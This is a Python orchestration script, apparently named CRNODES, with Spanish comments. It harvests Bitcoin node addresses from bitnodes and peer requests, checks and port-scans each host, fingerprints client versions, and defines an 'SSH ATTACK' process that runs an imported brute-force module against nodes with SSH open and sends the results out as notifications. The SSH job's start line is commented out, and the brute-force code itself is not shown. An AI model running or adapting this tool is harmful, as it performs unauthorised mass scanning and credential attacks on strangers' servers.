import logging
import multiprocessing
import json
from database import database
from extdata import getdata
from tools import procdata, ssh_bruteforce
from network import network
import time
## Configuramos el formato de log
logging.basicConfig(filename='crnodes.log',format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)

## Función de primer lanzamiento, crea BBDD y la rellena con los datos de bitnodes
def first_run():
    logging.warning("La BBDD no existe")
    logging.info("Se creará la BBDD")
    database.create_database()
    logging.info("Base de datos creada correctamente")
    ## Cargamos los datos desde external data source (bitnodes)
    logging.info("Realizando primera carga en la BBDD")
    for address, port in getdata.bitnode_dict().items():
        address_type = procdata.check_ip_address_type(address)
        if address_type == "IPv4":
            if network.check_port(address, int(port)):
                logging.info("Detectado nodo con puerto abierto: "+address+":"+port)
                database.insert_new_node(address, address_type, port)
    
## tenemos datos en la bbdd, son equipos que aceptan conexiones entrantes.
                
## Función de limpieza
def cleaner():
    while True:
        node_list = database.all_nodes()
        for address, bitcoin_port, online_score in node_list:
            logging.info("| CLEANER | Comprobando "+address+" online score="+str(online_score) )
            if online_score == 0:
                logging.critical("Eliminado nodo "+address+" online score 0")
                database.delete_node(address)
            else:
                online_score = online_score -1
                if network.check_port(address, int(bitcoin_port)):
                    logging.info("| CLEANER | "+address + " continua online ponemos score a "+str(online_score))
                    database.update_online_score(address, 100)
                else:
                    online_score = online_score -1
                    logging.info("Nodo apagado o fuera de cobertura pasa un score de "+str(online_score))
                    database.update_online_score(address, online_score)

## completamos la versión del cliente Bitcoin 
def complete_user_agent():
    while True:
        node_list =database.no_user_agent()
        for address, bitcoin_port in node_list:
            logging.info("| USER_AGENT | Detectando version nodo Bitcoin en "+address)
            user_agent = network.get_node_version(address, bitcoin_port)
            if user_agent == 'Error':
                logging.warning("| USER_AGENT | No se pudo detectar version nodo Bitcoin en "+address)
                pass
            else:
                logging.info("| USER_AGENT | Detectado "+user_agent+ " en "+ address)
                database.add_user_agent(address, user_agent)

## escaneo puertos 
def port_scan():
    while True:
        node_list = database.no_scan_date()
        for node in node_list:
            logging.info("| PORT SCAN | Detectando puertos abiertos en "+node[0])
            open_port_list = network.scan_open_ports(node[0])
            if len(open_port_list)<50:
                logging.info("| PORT SCAN | Puertos abiertos en "+node[0])
                database.add_open_ports(node[0], json.dumps(open_port_list))
            else:
                logging.warn("| PORT SCAN | Detectado posible Honeypot en "+node[0])
                database.add_open_ports(node[0], "ALL OPEN")

def get_more_nodes():
    while True:
        node_list= database.all_nodes()
        for address, bitcoin_port, online_score in node_list:
            logging.info("| GET NODES | Solicitando nodos a  "+address)
            for address, port in network.get_more_nodes(address, bitcoin_port).items():
                address_type = procdata.check_ip_address_type(address)
                if address_type == "IPv4":
                    logging.info("| GET NODES | Comprobando si el nodo "+ address+ " acepta conexiones")
                    if network.check_port(address, int(port)):
                        logging.info("| GET NODES | Detectado nodo con puerto abierto: "+address+":"+port)
                        if database.insert_new_node(address, address_type, port) == "Error":
                            logging.warning("| GET NODES | Detectado nodo duplicado "+ address)
                    else:
                        logging.info("| GET NODES | Comprobando si el nodo "+ address+ " acepta conexiones")

def attack_ssh():
    while True:
        node_list = database.ssh_open_nodes()
        for node in node_list:
            logging.info("| SSH ATTACK | Comenzando ataque a "+node[0])
            try:
                result = ssh_bruteforce.is_ssh_open(node[0])
                if result is not False and len(result)>6:
                    network.send_notification(result)
            except Exception:
                pass    

if __name__ == '__main__':
    logging.info('Arranque script CRNODES')
    first_run_job = multiprocessing.Process(
        name='first_run',
        target=first_run
    )
    cleaner_job = multiprocessing.Process(
        name='cleaner',
        target=cleaner,
    )
    user_agent_job = multiprocessing.Process(
        name='user_agent',
        target=complete_user_agent
    )
    port_scan_job = multiprocessing.Process(
        name='port_scan',
        target=port_scan
    )
    get_more_nodes_job = multiprocessing.Process(
        name='get_more_nodes',
        target=get_more_nodes
    )
    ssh_bruteforce_job = multiprocessing.Process(
        name='ssh_bruteforce',
        target=attack_ssh
    )
    if database.check_database_exist():
        pass
    else:
        first_run_job.start()
        logging.info("Primer arranque detectado")
        time.sleep(60)
    cleaner_job.start()
    logging.info("Proceso cleaner iniciado")
    user_agent_job.start()
    logging.info("Proceso user agent iniciado")
    port_scan_job.start()
    logging.info("Proceso scaner puertos iniciado")
    get_more_nodes_job.start()
    logging.info("Proceso detectar más nodos iniciado")
    #ssh_bruteforce_job.start()
    logging.info("Proceso ataque ssh iniciado")